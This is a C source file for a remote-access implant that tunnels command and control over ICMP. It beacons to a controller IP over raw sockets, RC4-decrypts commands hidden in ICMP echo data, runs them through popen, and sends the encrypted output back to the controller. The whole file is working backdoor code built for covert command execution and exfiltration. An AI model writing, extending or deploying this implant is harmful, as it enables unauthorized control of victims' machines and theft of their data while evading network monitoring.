#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../include/implant.h"
#include "../include/utils.h"

// creates a raw ICMP socket and binds it
int create_socket(void) {
    int sockfd;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        exit(EXIT_FAILURE);
    }

    return sockfd;
}

// runs the command from the C2 and stores it in output, and returns the output size
size_t invoke_command(unsigned char *data, unsigned char *output) {
    FILE *ptr;
    char *command;
    size_t buffer_size, data_section_size = strlen((char *) data);
    unsigned char *buffer = (unsigned char *) malloc(BUFFER_SIZE * sizeof(unsigned char));
    CHECK_ALLOC(buffer);

    // decrypt the command
    rc4(data, data_section_size, (unsigned char *) KEY, KEY_LENGTH, buffer);

    buffer[data_section_size] = '\0';

    command = strcat((char *) buffer, " 2>&1"); // redirect stderr to stdout

    ptr = popen(command, "r");
    if (ptr == NULL) {
        return 0;
    }

    memset(command, '\0', strlen(command));

    buffer_size = fread(buffer, 1, BUFFER_SIZE, ptr);

    // encrypt the output
    rc4((unsigned char *) buffer, buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);

    free(buffer);
    pclose(ptr);

    return buffer_size;
}

// sends a beacon to the C2 with the magic byte
int send_beacon(int sockfd, char *dst_ip) {
    unsigned char *packet;
    struct icmphdr *icmp;
    struct sockaddr_in dst;
    ssize_t bytes_num;
    size_t packet_size = sizeof(struct icmphdr) + 32;

    packet = (unsigned char *) malloc(packet_size * sizeof(unsigned char *));
    icmp = (struct icmphdr *) packet;

    // setting the IP options
    dst.sin_family = AF_INET;
    inet_aton(dst_ip, &dst.sin_addr);

    implant_append_to_data_section(icmp, (unsigned char *) "abcdefghijklmnopqrstuvwabcdefghi");

    implant_prep_icmp_headers(icmp, packet_size);

    bytes_num = sendto(sockfd, icmp, packet_size, 0, (struct sockaddr *) &dst, sizeof(dst));
    if (bytes_num < 0) {
        free(packet);
        return -1;
    }

    free(packet);

    return 1;
}

// the actual interaction occurs here
void interact(int sockfd, char *dest_ip) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    unsigned char *data; // holds the ICMP's data section
    unsigned char *output; // holds the output of the command
    unsigned char *packet; // holds the packet
    struct sockaddr_in addr;
    size_t nbytes, packet_size, output_size;

    output = (unsigned char *) malloc(sizeof(unsigned char) * BUFFER_SIZE);
    CHECK_ALLOC(output);

    // calculating the packet size
    packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + BUFFER_SIZE;

    // allocating a buffer to store the recieved ICMP packet
    packet = (unsigned char *) malloc(sizeof(unsigned char) * packet_size);
    CHECK_ALLOC(packet);

    while (1) {
        // send a beacon and wait
        if (send_beacon(sockfd, dest_ip) < 1) {
            goto out;
        }

        if (!read_from_socket(sockfd, packet, packet_size)) {
            goto out;
        }

        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
        if (check_magic_byte(icmp)) {
            break;
        }
    }

    while (1) {
        if ((nbytes = read_from_socket(sockfd, packet, packet_size) < 0)) {
            break;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {
            // set the IP & ICMP headers for later usage
            addr = prep_ip_headers(ip);

            // get the data section (ignoring the IP & ICMP headers)
            data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
            data[nbytes - (sizeof(struct iphdr) + sizeof(struct icmphdr))] = '\0';

            // invoke the command
            output_size = invoke_command(data, output);

            // put the output in the data section of the ICMP packet
            memcpy(data, output, output_size);

            implant_prep_icmp_headers(icmp, output_size);

            // send it
            nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + output_size, 0, (struct sockaddr *) &addr, sizeof(addr));
            if (nbytes < 0) {
                break;
            }

            // clean up the packet buffer for the next usage
            memset(packet, '\0', packet_size);
        }
    }

out:
    free(output);
    free(packet);
    return;
}

// initializes the options and starts the implant
void implant_init_n_call(char *dest_ip) {
    int sockfd = create_socket();

    interact(sockfd, dest_ip);

    close(sockfd);
}
